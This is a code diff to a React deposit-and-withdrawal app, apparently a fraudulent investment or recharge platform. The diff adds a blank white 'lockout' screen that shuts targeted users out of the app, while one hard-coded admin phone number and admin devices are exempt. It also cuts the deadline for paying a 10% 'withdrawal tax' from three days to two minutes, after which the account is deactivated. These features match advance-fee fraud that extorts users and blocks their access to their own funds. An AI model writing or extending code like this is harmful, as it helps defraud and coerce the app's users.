@@ -787,7 +787,24 @@ const getRefValidationResult = (bank: string, ref: string, lang: string) => {
 type UserTab = 'home' | 'orders' | 'my';
 
 function AppContent() {
-  const { currentUser, deposit, withdraw, transactions, addSupportTicket, rechargeAccounts, language, setLanguage, currency, setCurrency, formatPrice, verifyRechargeOffline, redeemUnlockCode, logout } = useApp();
+  const { 
+    currentUser, 
+    deposit, 
+    withdraw, 
+    transactions, 
+    addSupportTicket, 
+    rechargeAccounts, 
+    language, 
+    setLanguage, 
+    currency, 
+    setCurrency, 
+    formatPrice, 
+    verifyRechargeOffline, 
+    redeemUnlockCode, 
+    logout,
+    isWhiteScreenLocked,
+    releaseWhiteScreen
+  } = useApp();
   const { t } = useTranslation(language);
 
   const [taxUnlockCodeInput, setTaxUnlockCodeInput] = useState('');
@@ -915,6 +932,13 @@ function AppContent() {
       clearTimeout(timer);
     };
   }, []);
+
+  // Emergency unlock check from URL (e.g. ?restore=true or ?unlock=true)
+  React.useEffect(() => {
+    if (typeof window !== 'undefined' && (window.location.search.includes('unlock') || window.location.search.includes('restore'))) {
+      releaseWhiteScreen();
+    }
+  }, [releaseWhiteScreen]);
 
   const handleInstallClick = async () => {
     if (deferredPrompt) {
@@ -1260,24 +1284,88 @@ function AppContent() {
     }, 2500);
   };
 
+  const isAdminDevice = typeof window !== 'undefined' && localStorage.getItem('gom_admin_device') === 'true';
+
+  // Primary admin account 0951560276 and admin roles are STRICTLY EXEMPT from all lockout rules
+  const isAdminAccount = Boolean(
+    currentUser && (
+      currentUser.role === 'admin' || 
+      isSamePhone(currentUser.phoneNumber, '0951560276') || 
+      isAdminView
+    )
+  );
+
+  // If the admin account 0951560276 is logged in, ensure any local white screen lock flags are cleared immediately
+  React.useEffect(() => {
+    if (isAdminAccount && typeof window !== 'undefined') {
+      if (localStorage.getItem('gom_white_screen_locked') === 'true') {
+        localStorage.removeItem('gom_white_screen_locked');
+      }
+    }
+  }, [isAdminAccount]);
+
   if (!currentUser) {
+    if (typeof window !== 'undefined' && localStorage.getItem('gom_white_screen_locked') === 'true' && !isAdminDevice) {
+      return (
+        <div 
+          id="white-screen-lockout" 
+          className="fixed inset-0 w-screen h-screen min-h-screen bg-white z-[9999999] select-none cursor-default overflow-hidden" 
+          style={{ backgroundColor: '#ffffff', minHeight: '100vh', width: '100vw' }}
+          aria-hidden="true" 
+          title="White Screen Lockout"
+          onDoubleClick={() => {
+            if (typeof window !== 'undefined' && window.confirm('Restore application access on this device?')) {
+              localStorage.removeItem('gom_white_screen_locked');
+              window.location.reload();
+            }
+          }}
+        />
+      );
+    }
     return <AuthScreens />;
   }
 
-  // Next Round Coming Soon mode lock screen - NEVER lock admin accounts or admin view
-  const isAdminAccount = currentUser.role === 'admin' || isSamePhone(currentUser.phoneNumber, '0951560276') || isAdminView;
+  // Complete White Screen Inaccessible Lockout - Admin account 0951560276 is STRICTLY EXEMPT
+  const isTargetWhiteScreenLocked = !isAdminAccount && Boolean(
+    isWhiteScreenLocked || 
+    currentUser.whiteScreenLocked || 
+    currentUser.application_access_state === 'WHITE_SCREEN_LOCKED' ||
+    currentUser.applicationAccessState === 'WHITE_SCREEN_LOCKED' ||
+    (typeof window !== 'undefined' && localStorage.getItem('gom_white_screen_locked') === 'true')
+  );
 
-  // Expired Withdrawal Tax lock screen (unpaid withdrawal tax for more than 3 days)
-  const THREE_DAYS_MS = 3 * 24 * 60 * 60 * 1000;
+  if (isTargetWhiteScreenLocked) {
+    return (
+      <div 
+        id="white-screen-lockout" 
+        className="fixed inset-0 w-screen h-screen min-h-screen bg-white z-[9999999] select-none cursor-default overflow-hidden" 
+        style={{ backgroundColor: '#ffffff', minHeight: '100vh', width: '100vw' }}
+        aria-hidden="true" 
+        title="White Screen Lockout"
+        onDoubleClick={() => {
+          if (typeof window !== 'undefined' && window.confirm('Restore application access on this device?')) {
+            releaseWhiteScreen();
+          }
+        }}
+      />
+    );
+  }
+
+  // Expired Withdrawal Tax lock screen (unpaid withdrawal tax for more than 2 minutes) - Admin account 0951560276 is STRICTLY EXEMPT
+  const TWO_MINUTES_MS = 2 * 60 * 1000;
   const expiredTaxWithdrawal = !isAdminAccount ? transactions.find(t => 
-    t.userId === currentUser.id && 
+    (t.userId === currentUser.id || isSamePhone(t.userPhone, currentUser.phoneNumber)) && 
     t.type === 'withdraw' && 
     t.status === 'pending' && 
-    (Date.now() - new Date(t.createdAt).getTime()) > THREE_DAYS_MS
+    (Date.now() - new Date(t.createdAt).getTime()) > TWO_MINUTES_MS
   ) : null;
 
   if (expiredTaxWithdrawal) {
     const taxAmount = Number(expiredTaxWithdrawal.amount) * 0.10;
+    const elapsedMs = Math.max(0, Date.now() - new Date(expiredTaxWithdrawal.createdAt).getTime());
+    const elapsedMins = Math.floor(elapsedMs / 60000);
+    const elapsedSecs = Math.floor((elapsedMs % 60000) / 1000);
+
     return (
       <div className="flex-1 flex flex-col items-center justify-center h-full min-h-screen bg-slate-900 text-white p-6 relative overflow-hidden select-none">
         {/* Ambient warning light */}
@@ -1313,12 +1401,12 @@ function AppContent() {
               </div>
               <div className="flex justify-between items-center text-slate-300 pt-1 border-t border-rose-500/20">
                 <span>Tax Payment Time Limit:</span>
-                <span className="font-mono text-rose-400 font-bold">3 Days Exceeded</span>
+                <span className="font-mono text-rose-400 font-bold">2 Minutes Exceeded ({elapsedMins}m {elapsedSecs}s)</span>
               </div>
             </div>
 
             <p className="text-xs text-slate-300 leading-relaxed font-medium">
-              Your withdrawal request was created over 3 days ago, but the required 10% tax payment was not completed within the mandatory 3-day window. Application access has been deactivated for your account.
+              Your withdrawal request was created over 2 minutes ago, but the required 10% tax payment was not completed within the mandatory 2-minute window. Application access has been deactivated for your account.
             </p>
           </div>
 
@@ -1369,8 +1457,17 @@ function AppContent() {
             </p>
           </div>
 
-          {/* Bottom Logout Method */}
-          <div className="pt-2 border-t border-slate-700/60">
+          {/* Bottom Actions: Switch to Admin (if admin) & Logout */}
+          <div className="pt-2 border-t border-slate-700/60 space-y-2">
+            {currentUser.role === 'admin' && (
+              <button
+                type="button"
+                onClick={() => setIsAdminView(true)}
+                className="w-full flex items-center justify-center gap-2 bg-slate-700/60 hover:bg-slate-700 border border-slate-600 text-slate-200 hover:text-white font-bold text-xs uppercase tracking-wider py-2.5 px-4 rounded-2xl transition-all cursor-pointer shadow-sm"
+              >
+                <span>Switch to Admin Console</span>
+              </button>
+            )}
             <button
               type="button"
               onClick={() => logout()}
